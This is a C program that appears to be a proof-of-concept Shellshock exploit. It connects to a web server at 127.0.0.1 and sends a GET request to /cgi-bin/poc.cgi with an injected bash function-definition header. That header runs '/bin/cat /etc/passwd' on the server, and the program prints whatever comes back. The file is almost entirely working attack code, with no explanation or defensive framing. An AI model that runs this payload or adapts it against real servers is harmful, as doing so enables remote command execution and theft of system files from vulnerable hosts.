#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define HOST "127.0.0.1"
#define PORT 80

#define MAXLINE 500

int main(int argc, char *argv[]) {

    struct sockaddr_in dest;
    int sockfd;

    // Create socket file descriptor.
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // Populate dest with relevant data.
    dest.sin_family = AF_INET;  //AF = Address Family, INET = Internet
    dest.sin_addr.s_addr = inet_addr(HOST); //helps with Endianness
    dest.sin_port = htons(PORT); //helps with Endianness

    // Create a TCP connection. If connection fails, exit.
    int result = connect(sockfd, (struct sockaddr *)&dest,sizeof(struct sockaddr));

    if(result != 0)
    {
        puts("Unable to establish connection!");
        return 1;
    }

    char request[MAXLINE + 1], response[MAXLINE + 1];
    char* ptr;
    char* page = "/cgi-bin/poc.cgi";
    char* host = "127.0.0.1";
    char* payload = "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd";

    size_t n;

    // GET request
    snprintf(request, MAXLINE + 1, 
	     "GET %s HTTP/1.0\r\n"
	     "Host: %s\r\n"
	     "Content-type: application/x-www-form-urlencoded\r\n"
	     "test: %s\r\n\r\n",
	     page, host, payload);

    //Debug, print the request
    //puts(sendline);

    // Write the request
    if (write(sockfd, request, strlen(request))>= 0) 
    {
        // Read the response 
        while ((n = read(sockfd, response, MAXLINE)) > 0) 
	{
  	    response[n] = '\0';

	    fputs(response,stdout);
	}          
    }

    return 0;
}
